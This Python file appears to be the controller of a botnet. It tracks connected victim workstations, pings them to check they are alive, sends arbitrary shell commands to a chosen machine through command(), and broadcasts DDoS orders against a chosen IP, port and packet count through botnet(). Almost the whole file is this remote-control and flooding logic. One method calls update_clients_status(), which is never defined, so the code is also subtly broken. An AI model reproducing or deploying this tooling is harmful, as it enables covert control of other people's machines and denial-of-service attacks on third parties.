import time

class Station:
    def __init__(self, client, addr, connected):
        self.client = client
        self.addr = addr
        self.connected = connected

    def get_client(self):
        return self.client

    def get_addr(self):
        return self.addr
    
    def get_connected(self):
        return self.connected
    
    def set_connected(self, connected):
        self.connected = connected 
    
    def to_json(self):
        return {
            "connected": self.connected,
            "ip": self.addr[0],
            "port": self.addr[1]
        }
    
class Client:
    work_stations = []

    def addWorkstation(self, client, addr):
        ip = addr[0]
        station = Station(client, addr, True)
        # Check if client already exists
        existing_index = next((index for index, c in enumerate(self.work_stations) if c.get_addr()[0] == ip), None)

        if existing_index is not None:
            self.work_stations[existing_index] = station
            print(f"NOTICE: {ip} Reconnected")
        else:
            self.work_stations.append(station)
            print(f"NOTICE: {ip} Connected")

    def ping_all_clients(self): 
        for client in self.work_stations:
            client_socket = client.get_client()
            result = ""
            status = "OFFLINE"
            try:
                client_socket.sendall("ping -n 1 8.8.8.8".encode())
                result = client_socket.recv(2048).decode()
            except Exception:
                pass
            
            if "TTL" in result:
                status = "ONLINE"
                client.set_connected(True)
            else:
                client.set_connected(False)
            print("CONNECTED CLIENTS: \n {0} -> {1}:\n".format(client.get_addr()[0], status))
            # print("CONNECTED CLIENTS: \n {0} -> {1} {2}:\n".format(counter, client.get_addr()[0], status))
            # counter += 1
        for client in self.work_stations:
            print(client.to_json())

    def ping_refresh(self):
        while True:
            print("Refreshed")
            self.ping_all_clients()
            time.sleep(5)

    def command(self, client_index, command):  # Printing all clients and choosing operation to perform
        self.update_clients_status()
        client_socket = self.work_stations[client_index].get_client()
        client_socket.sendall(command.encode())
        result = client_socket.recv(2048).decode()
        print(result)

    def botnet(self, target_ip, target_port, num_of_packets):  # DDoS attack on chosen IP
        # target_ip = str(input("[+] Enter ip address to attack:"))
        # target_port = str(input("[+] Port:"))
        # num_of_packets = str(input("[+] Num of packets:"))
        for i in range(len(self.work_stations)):
            client_socket = self.work_stations[i].get_client()
            command = "DDOS," + target_ip + "," + target_port + "," + num_of_packets
            client_socket.sendall(command.encode())
    
    def get_work_stations(self):
        return self.work_stations